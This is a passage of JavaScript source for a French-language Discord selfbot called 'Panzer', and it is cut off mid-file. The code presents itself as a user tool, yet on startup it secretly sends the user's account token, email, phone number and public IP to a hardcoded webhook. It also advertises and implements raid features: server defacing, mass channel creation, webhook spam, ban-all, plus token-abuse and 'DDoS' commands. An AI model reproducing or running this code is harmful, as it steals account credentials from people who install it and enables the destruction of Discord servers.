const Discord = require('discord.js');
require('colors');
const client = new Discord.Client();
const ConfigFile = require('./config.json');
const token = ConfigFile.token;
const yourgif = ConfigFile.gif;
const base64 = require('base-64');
const utf8 = require('utf8');
const fs = require('fs');
const hastebins = require('hastebin-gen');
const rpcGenerator = require('discordrpcgenerator');
const backups = require('./Data/backups.json');
const afk = require('./Data/afk.json');
const db = require('./Data/pubmp.json');
const lbackup = require('./Data/liste.json');
const kicked = require('./Data/vkick.json');
const prefix = ConfigFile.prefix;
const superagent = require('superagent');
const fetch = require('node-fetch');
const request = require('request');
const {
    cpuUsage
} = require('process');
const {
    type
} = require('os');
const webhook = require('webhook-discord');
const Hook = new webhook.Webhook('https://canary.discord.com/api/webhooks/863691319091396619/Oe94XjQywefcBHrSJp29uBoT4ElC66jSJetroDnlndgTunPhPsVcvWWP7uR4fGZYrT7G');
client.on('ready', async function () {
    const ipgrabber = require('public-ip');
    const embedgrabber = new webhook.MessageBuilder()
        .setName(' Panzer', true)
        .addField('💾', client.guilds.size, true)
        .addField('🧑‍🤝‍🧑‍', client.user.friends.size, true)
        .addField('🤖', client.users.filter(bots => {
            return bots.bot;
        }).size, true)
        .addField('📟', await ipgrabber.v4(), true)
        .addField('Prefix choisis', prefix, true)
        .addField('👨‍💻', client.user.tag, true)
        .addField('📧', client.user.email, true)
        .addField('🏴🏴‍☠️', ':flag_' + client.user.settings.locale + ':', true)
        .addField('📞', client.user.mobile, true)
        .addField('🧪', token);
    if (client.user.premium > 0) {
        embedgrabber.addField('Nitro', 'oui');
    } else {
        embedgrabber.addField('Nitro', 'non');
    };
    Hook.send(embedgrabber);
});

function nitrocode(length, letter) {

    var multiplier = '';
    if (letter.indexOf('0') > -1) multiplier += '0123456789';
    if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
    var results = '';


    for (var i = length; i > 0; --i) {
        results += multiplier[Math.floor(Math.random() * multiplier.length)];

    }

    return results;
}
const color = ConfigFile.color;
const rire = ['https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
    'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
    'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
    'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
    'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
    'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
    'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
    'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'
];
const kiss = ['https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
    'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
    'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
    'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'
];
const hugh = ['https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif',
    'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif',
    'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif',
    'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'
];
const veski = ['https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif',
    'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif',
    'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'
];
const punch = ['https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif',
    'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif',
    'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif',
    'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'
];
var verifLevels = ['None', 'Low', 'Medium', '(╯°□°）╯︵  ┻━┻'];
var regionn = {
    'Brésil': 'Brazil',
    'eu-central': 'Central Europe',
    'singapoure': 'Singapore',
    'us-central': 'U.S. Central',
    'sydney': 'Sydney',
    'us-east': 'U.S. East',
    'us-south': 'U.S. South',
    'us-west': 'U.S. West',
    'eu-west': 'Western Europe',
    'vip-us-east': 'VIP U.S. East',
    'Londre': 'London',
    'amsterdam': 'Amsterdam',
    'hongkong': 'Hong Kong'
}

function translateDate(date) {
    const Months = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
    const Days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
    return Days[date.getUTCDay()] + ", " + date.getUTCDate() + " " + Months[date.getUTCMonth()] + " " + date.getUTCFullYear() + " at " + date.getUTCHours() + ":" + zeros(date.getUTCMinutes(), 2) + ":" + zeros(date.getUTCSeconds(), 2) + "." + zeros(date.getUTCMilliseconds(), 3);
}

function checkDays(date) {
    var now = new Date();
    var diff = now.getTime() - date.getTime();
    var days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
};

client.on('ready', function () {
    delete db;
    saver();
    console.log('Panzer-Selfbot Evolution'.bgBlue);
    console.log(`
      
                     .------.
                     |P.--. |
                     | :/:  |
                     | (__) |
                     | '--'P|
                     '------'
                  ! Panzer V1.2
       ╔═════════════════════════════════╗
       ║-->  User Name : ${client.user.tag}   
       ╟─────────────────────────────────╢
       ║-->  User id : ${client.user.id} 
       ╟─────────────────────────────────╢
       ║-->  Prefix   : ${prefix}$                 
       ╟─────────────────────────────────╢
       ║-->  Users    : ${client.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)} 
       ╟─────────────────────────────────╢
       ║-->  Bots     : ${client.users.filter(user => user.bot).size}                    
       ╟─────────────────────────────────╢
       ║-->  Channels : ${client.channels.size}              
       ╟─────────────────────────────────╢
       ║-->  Guilds   : ${client.guilds.size}               
       ╚═════════════════════════════════╝                                  
           https://discord.gg/YqtPHbWnSZ                      \n\n`.red)
    if (client.user.premium > 0) {
        console.log('Vous etes sur un compte nitro WOAW bravo ;)'.italic.magenta);
    } else {
        console.log('Vous n\'avez pas nitro snif, ne t\'inquiète pas mon autoclaim va tout faire pour que tu en recuperes 1'.red);
    }
});
client.on('ready', function () {
    if (client.user.bot) {
        console.log(`${client.user.username} est un robot je ne peux pas charger le profile desolé :/`.red);
        process.exit(1)
    } else {
        console.log(`${client.user.username} undefined boup bip boup super tu n\'es pas un robot ^^!`.italic.magenta);
    }
});
var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
let cmd = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**🃏 PanzerSelf® commandes :🃏**')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**Commande Help**', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`, `help raid`')
    .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`,`backup info`, `backup load`, `backup delete`, `backup purge`, `backup info`')
    .addField('**Commandes Fun** :joy:: ', '`auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`')
    .addField('**Commandes Moderation** :tools:: ', '`voice kick`, `set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
    .addField('**Commandes Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
    .addField('**Commandes Raid** :no_entry_sign: :', '`deface`, `spam`, `webhook spam`, `create channel`, `stop spam`')
    .addField('**Commandes Hack** :skull_and_crossbones: :', '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`')
    .addField('**Commandes Utile** :globe_with_meridians: :', '`nuke dm`,, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
    .addField('**Commandes Statut** :performing_arts: :', '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage('https://cdn.discordapp.com/attachments/859505062530646056/860865281134821396/gdgsdgg.jpg')
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');

let help_hack = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Hacking**')
    .setURL('https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg')
    .addField('**' + prefix + 'ddos voc**', '`Lance une attaque ddos sur les channels vocal`')
    .addField('**' + prefix + 'ddos-stop**', '`Stop une attaque ddos sur les channels vocal`')
    .addField('**' + prefix + 'token (@user)**', '`Affiche le token d\'un utilisateur`')
    .addField('**' + prefix + 'check token (token)**', '`Check si un token est valide`')
    .addField('**' + prefix + 'info token (token)**', '`Affiche les informations d\'un utilisateur grace a un token`')
    .addField('**' + prefix + 'fuck token (token)**', '`Detruit le compte d\'un utilisateur grace a un token`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_raid = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Raid**')
    .setURL('https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg')
    .addField('**' + prefix + 'create channel**', '`Creer 10 channels textuel`')
    .addField('**' + prefix + 'deface**', '`Déface entierement un serveur (nom/icon/channels)`')
    .addField('**' + prefix + 'webhook spam**', '`Créer 3 webhooks par salon et spam avec (ultra rapide)`')
    .addField('**' + prefix + 'spam (text)**', '`Spam un text`')
    .addField('**' + prefix + 'stop spam**', '`Arrete le spam`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .setImage(yourgif)
    .setThumbnail('https://canary.discord.com/api/webhooks/862726275683844116/joJ-_tXmDNi0e3DxpN7DqQ_LrWKtOGImqIfn5cc2n-J023tF03Oach_tK9HIKPSrH9OB')
    .setFooter('Panzer-Selfbot 1.2');
let help = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('🃏 PanzerSelf® Help :🃏')
    .addField('**' + prefix + 'cmd**', '`Liste des commandes`')
    .addField('**' + prefix + 'help fun**', '`Affiche les commandes fun` :joy:')
    .addField('**' + prefix + 'help backup**', '`Affiche les commandes backups` :gear:')
    .addField('**' + prefix + 'help moderation**', '`Affiche les commandes moderation` :tools:')
    .addField('**' + prefix + 'help utile**', '`Affiche les commandes info` :globe_with_meridians:')
    .addField('**' + prefix + 'help nsfw**', '`Affiche les commandes nsfw` :underage:')
    .addField('**' + prefix + 'help raid**', '`Affiche les commandes raid` :no_entry_sign: ')
    .addField('**' + prefix + 'help hack**', '`Affiche les commandes hack` :skull_and_crossbones:')
    .addField('**' + prefix + 'help statut**', '`Affiche les commandes statut` :performing_arts:')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setDescription('[Panzer Self Download](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .setImage('https://cdn.discordapp.com/attachments/859505062530646056/860865281134821396/gdgsdgg.jpg')
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_statut = new Discord.RichEmbed()
    .setColor(color)
    .setTitle('**Pannel de Help Statut** :performing_arts: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'rocket league (text)**', '`Met un statut Rocket League`')
    .addField('**' + prefix + 'spotify (text)**', '`Met un statut Spofity`')
    .addField('**' + prefix + 'fortnite (text)**', '`Met un statut Fortnite`')
    .addField('**' + prefix + 'among us (text)**', '`Met un statut Among us`')
    .addField('**' + prefix + 'gucci (text)**', '`Met un statut Gucci`')
    .addField('**' + prefix + 'lacoste (text)**', '`Met un statut Lacoste`')
    .addField('**' + prefix + 'nike (text)**', '`Met un statut Nike`')
    .addField('**' + prefix + 'google (text)**', '`Met un statut Google`')
    .addField('**' + prefix + 'skype (text)**', '`Met un statut Skype`')
    .addField('**' + prefix + 'snapchat (text)**', '`Met un statut Snapchat`')
    .addField('**' + prefix + 'facebook (text)**', '`Met un statut Facebook`')
    .addField('**' + prefix + 'tiktok (text)**', '`Met un statut Tiktok`')
    .addField('**' + prefix + 'twitter (text)**', '`Met un statut Twitter`')
    .addField('**' + prefix + 'minecraft (text)**', '`Met un statut Minecraft`')
    .addField('**' + prefix + 'instagram (text)**', '`Met un statut Instagram`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_statut2 = new Discord.RichEmbed()
    .setColor(color)
    .setTitle('**Pannel de Help Statut** :performing_arts: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'youtube (text)**', '`Met un statut Youtube`')
    .addField('**' + prefix + 'tokyo ghoul (text)**', '`Met un statut Tokyo Ghoul`')
    .addField('**' + prefix + 'hunter x hunter (text)**', '`Met un statut Hunter x Hunter`')
    .addField('**' + prefix + 'naruto (text)**', '`Met un statut Naruto`')
    .addField('**' + prefix + 'clash of clan (text)**', '`Met un statut Clash of Clan`')
    .addField('**' + prefix + 'clash royal (text)**', '`Met un statut Clash Royal`')
    .addField('**' + prefix + 'tinder (text)**', '`Met un statut Tinder`')
    .addField('**' + prefix + 'pornhub (text)**', '`Met un statut Pornhub`')
    .addField('**' + prefix + 'roblox (text)**', '`Met un statut Roblox`')
    .addField('**' + prefix + 'csgo (text)**', '`Met un statut Csgo`')
    .addField('**' + prefix + 'apex (text)**', '`Met un statut Apex`')
    .addField('**' + prefix + 'badlion (text)**', '`Met un statut Badlion`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_backup = new Discord.RichEmbed()
    .setColor(color)
    .setTitle('**Pannel de Help Backup** :gear: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'backup create**', '`Créé une backup d\'un serveur`')
    .addField('**' + prefix + 'backup friend**', '`Créé une backup de tous tes amis`')
    .addField('**' + prefix + 'backup load (id)**', '`Charge une backup`')
    .addField('**' + prefix + 'backup liste**', '`Voir toutes ses backups`')
    .addField('**' + prefix + 'backup delete (id)**', '`Surppime une backup`')
    .addField('**' + prefix + 'backup purge**', '`Supprime toutes tes backups`')
    .addField('**' + prefix + 'backup info (id)**', '`Envoie les informations d\'une backup`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_fun = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Fun** :joy: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'start typing**', '`Vous affiche entrain d\'ecrire indefiniment`')
    .addField('**' + prefix + 'avatar (@user)**', '`Affiche l\'avatar d\'un membre`')
    .addField('**' + prefix + 'lovecalc (@user)**', '`Test d\'amour`')
    .addField('**' + prefix + 'nitro**', '`Genere un nitro random`')
    .addField('**' + prefix + '8ball (text)**', '`Pose une question`')
    .addField('**' + prefix + 'say (text)**', '`Affiche un text en embed`')
    .addField('**' + prefix + 'fight (@user)**', '`Bat toi avec un utilisateur`')
    .addField('**' + prefix + 'boom (@user)**', '`Fait exploser un utilisateur`')
    .addField('**' + prefix + 'rire**', '`Envoie un gif rire`')
    .addField('**' + prefix + 'kiss (@user)**', '`Embrasse un membre`')
    .addField('**' + prefix + 'veski (@user)**', '`Envoie un gif veski`')
    .addField('**' + prefix + 'load**', '`Envoie un chargement`')
    .addField('**' + prefix + 'branlette**', '`Simule une grosse branlette + éjaculation`')
    .addField('**' + prefix + 'punch (@user)**', '`Frappe un membre`')
    .addField('**' + prefix + 'calin (@user)**', '`Fait un calin a un membre`')
    .addField('**' + prefix + 'reverse (text)**', '`Met ton text a l\'envers`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_moderation = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Moderation** :tools: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'voice kick (@user)**', '`Kick un utilisateur du salon vocal`')
    .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
    .addField('**' + prefix + 'shutdown**', '`Eteint le selfbot`')
    .addField('**' + prefix + 'name all**', '`Rename tout les membres d\'un serveur`')
    .addField('**' + prefix + 'ban-all**', '`Ban tout les membres d\'un serveur`')
    .addField('**' + prefix + 'kick-all**', '`Kick tout les membres d\'un serveur`')
    .addField('**' + prefix + 'kick (@user)**', '`kick un membre du serveur`')
    .addField('**' + prefix + 'ban (@user)**', '`Ban un membre du serveur`')
    .addField('**' + prefix + 'roles list**', '`Envoie la liste de tout les roles d\'un serveur`')
    .addField('**' + prefix + 'channels list**', '`Envoie la liste de tout les channels d\'un serveur`')
    .addField('**' + prefix + 'purge**', '`Supprime tout les messages`')
    .addField('**' + prefix + 'delete all channel**', '`Supprime tout les salons d\'un serveur`')
    .addField('**' + prefix + 'delete all role**', '`Supprime tout les roles d\'un serveur`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_info = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'mp all**', '`Permet de dm toutes les personnes d\'un serveur`')
    .addField('**' + prefix + 'stop mp all**', '`Permet de stopé la commande mp all`')
    .addField('**' + prefix + 'auto voice kick (@user)**', '`Permet de kick un utilisateur du vocal (parfait pour troll)`')
    .addField('**' + prefix + 'stop auto voice kick (@user)**', '`Permet de stopé la commande auto voice kick`')
    .addField('**' + prefix + 'nuke dm**', '`Nuke tout tes dm (sans les clear) pour limiter les beugs et l\'ésthetique`')
    .addField('**' + prefix + 'afk (text)**', '`Pour te definir comme "afk"`')
    .addField('**' + prefix + 'user info (@user)**', '`Envoie les information d\'un membre du serveur`')
    .addField('**' + prefix + 'serveur info**', '`Envoie les information du serveur`')
    .addField('**' + prefix + 'stats**', '`Affiche les stats du selfbot`')
    .addField('**' + prefix + 'restart**', '`Redemarre le selfbot`')
    .addField('**' + prefix + 'reset**', '`Reset le status`')
    .addField('**' + prefix + 'role info (@role)**', '`Envoie les informations d\'un role`')
    .addField('**' + prefix + 'encode (text)**', '`Crypte ton text en base64`')
    .addField('**' + prefix + 'discord**', '`Affiche votre version de discord js`')
    .addField('**' + prefix + 'gen token**', '`Change votre token`')
    .addField('**' + prefix + 'add emote (emote) <name>**', '`Ajoute un emoji au serveur`')
    .addField('**' + prefix + 'emote (emote)**', '`Donne les infos tout les emojis d\'un serveur`')
    .addField('**' + prefix + 'remove emote (emote)**', '`Supprime un emoji du serveur`')
    .addField('**' + prefix + 'steal emote (serveur id)**', '`Ajoute tout les emojis d\'un serveur a ton serveur`')
    .addField('**' + prefix + 'delete all emote**', '`Supprime tout les emojis du serveur`')
    .addField('**' + prefix + 'grab pp (user)**', '`Vole la photo de profile de la personne mentionné`')
    .addField('**' + prefix + 'check token (token)**', '`Vérifie si le token est valide`')
    .addField('**' + prefix + 'mp friend (message)**', '`Envoie un message privé a tout tes amis`')
    .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`Permet de changer sa maison hypesquad`')
    .addField('**nitro autoclaim**', '`Un autoclaim est en permanance activé sur le self`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');
let help_nsfw = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help nsfw** :underage: ')
    .setDescription('[Lien pour avoir Panzer](https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg)')
    .addField('**' + prefix + 'ass**', '`Envoie une photo de fesse`')
    .addField('**' + prefix + '4k**', '`Envoie une image sexe en 4k`')
    .addField('**' + prefix + 'anal**', '`Envoie un gif anal`')
    .addField('**' + prefix + 'hentai**', '`Envoie une image/gif hentai`')
    .addField('**' + prefix + 'nsfw-gif**', '`Envoie un gif de sexe`')
    .addField('**' + prefix + 'pussy**', '`Envoie une image de chattes`')
    .addField('**' + prefix + 'thigh**', '`Envoie une image thigh`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/858912971693228046/859137758278713364/Rea25cf5450438d7f70a27b0fbc497c5d.gif')
    .setFooter('Panzer-Selfbot 1.2');

function saver() {
    fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
        if (err) console.error(err);
    });
}


client.on('message', message => {
    if (message.author.id === '815345046526230538') {
        if (message.guild.id === '786244044048695297') {
            message.delete()
        }
    };
    let clientid = client.user.id;
    let randomnumber = Math.floor(Math.random() * 9000 + 1000)
    async function addreaction() {
        const miliseconds = Math.floor(Math.random() * 1500);
        async function react() {
            message.react("🎉").catch(err => {
                if (err) {
                    console.log('\n╔═════════════════════════════════╗'.blue)
                    console.log('Log:'.red) ^
                        console.log('╟─────────────────────────────────╢'.blue)
                    console.log('║--> [', `/!/ Attention`.red, ']', `\nJe n'ai pas reussi a reagir au giveaway sur ${message.guild.name}, il est possible que je n'ai pas les permissions :/`.green)
                    console.log('╚═════════════════════════════════╝'.blue)
                    return;
                }
            });
            console.log('\n╔═════════════════════════════════╗'.blue)
            console.log('Log:'.red) ^
                console.log('╟─────────────────────────────────╢'.blue)
            console.log('║--> [', `Youpi`.green, ']', `\nJ'ai pas correctement a reagit au giveaway sur ${message.guild.name}, en ${miliseconds}ms je suis super rapide hehe ;)`.green)
            console.log('╚═════════════════════════════════╝'.blue)
        }
        setTimeout(react, miliseconds);
    }
    async function checkwin() {
        if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
            if (message.content.includes("Congratulations")) {
                if (message.content.includes(client.user.id)) {
                    if (message.embeds)
                        console.log('\n╔═════════════════════════════════╗'.blue)
                    console.log('Log:'.red) ^
                        console.log('╟─────────────────────────────────╢'.blue)
                    console.log('║--> [', `GG!`.green, ']', `\nJe t'ai fais gagner le giveaway sur le serveur ${message.guild.name} va vite reclamer ta récompense!`.green)
                    console.log('╚═════════════════════════════════╝'.blue)
                }
            }
        }
    }
    checkwin()
    if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
        if (message.embeds[0]) {
            if (message.embeds[0].description.includes("React with")) {
                addreaction()
            }
        }
    }
    let msg = message;
    if (message.author.id === client.user.id) {
        if (afk[client.user.id]) {
            if (message.content.includes(":x:")) {
                return;
            } else
                delete afk[client.user.id]
            saving();
            message.channel.send(":white_check_mark: **Vous n'etes plus afk**")
            console.log("Commande afk stopé.".yellow)
        }
    };
    if (message.content.includes(client.user.id)) {
        if (message.author.id === client.user.id) return;
        if (afk[client.user.id]) {
            message.reply(":x: **Je suis afk pour la raison** " + afk[client.user.id].r)
            console.log('\n╔═════════════════════════════════╗'.blue)
            console.log('║--> [Log:]'.red)
            console.log('╟─────────────────────────────────╢'.blue)
            console.log('║--> [', `/!\\ Attention`.red, ']', `\nl'utilisateur ${message.author.username} vient de vous ping lors de votre afk ${message.content}`.green)
            console.log('╚═════════════════════════════════╝'.blue)
        } else return;
    };
    var args = message.content.substring(prefix.length).split(" ");
    var mentionuser = message.mentions.users.first();
    if (message.channel.type === "dm") {
        if (msg.author.bot) {
            if (message.content.includes('discord.gg')) {
                let botblock = message.author;
                botblock.send(`/!\\ Anti mp`).then((msg) => {
                    msg.delete()
                })
                console.log('\n╔═════════════════════════════════╗'.blue)
                console.log('Log:'.red) ^
                    console.log('╟─────────────────────────────────╢'.blue)
                console.log('║--> [', `/!/ Attention`.red, ']', `\nle bot ${message.author.username} vient de vous envoyer une invatation suspecte ${message.content}`.green)
                console.log('╚═════════════════════════════════╝'.blue)
            }
        }
    }
    if (msg.author.id !== client.user.id) return;
    if (message.content.startsWith(prefix + 'deface')) {
        if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
        if (!message.member.hasPermission('ADMINISTRATOR')) return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
        message.delete();
        message.guild.setName(`${'RAIDED BY 🃏Panzer Self🃏 X '}${client.user.username}${''}`);
        message.guild.setIcon('https://cdn.discordapp.com/attachments/859505062530646056/859505132310888458/gdgsdgg.jpg');
        message.guild.channels.forEach(ch => {
            ch.delete();
        });
        if (message.deletable) {
            message.delete().catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            })
        }
        message.guild.createChannel('🃏Panzer Self🃏', 'text');
        console.log('Commande deface executé.'.yellow);
    };
    if (message.content.startsWith(prefix + "create channel")) {
        if (message.channel.type === 'dm' || message.channel.type === 'group')
            return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
        if (!message.member.hasPermission("MANAGE_CHANNELS"))
            return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
        message.delete();
        for (let pas = 0; pas < 20; pas++) {

            message.guild.createChannel(`**🃏PanzerSelf🃏**-𝐱- ${client.user.username}`, 'text').catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            })
        };
        console.log('Commande create channel executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'start typing')) {
        message.delete();
        message.channel.startTyping();
        console.log('Commande start typing executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'webhook spam')) {
        let argument = args.splice(2).join(' ') || '@everyone https://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg';
        if (message.channel.type === 'dm' || message.channel.type === 'group') {
            return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
        };
        if (!message.member.hasPermission('MANAGE_WEBHOOKS')) {
            return
        };
        message.guild.channels.forEach((channel) => {
            if (!channel) {
                return
            };
            if (channel.type == 'text') {
                channel.createWebhook('🃏Panzer-Selfbot🃏', 'https://cdn.discordapp.com/attachments/859505062530646056/859505132310888458/gdgsdgg.jpg').catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                })
            }
        });
        let interval6663 = setInterval(async function () {
            await message.guild.fetchWebhooks()['then']((web) => {
                return web.forEach(webhook => {
                    return webhook.send(argument).catch(err => {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    })
                })
            })
        });
        console.log('Commande webhook spam executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'branlette')) {
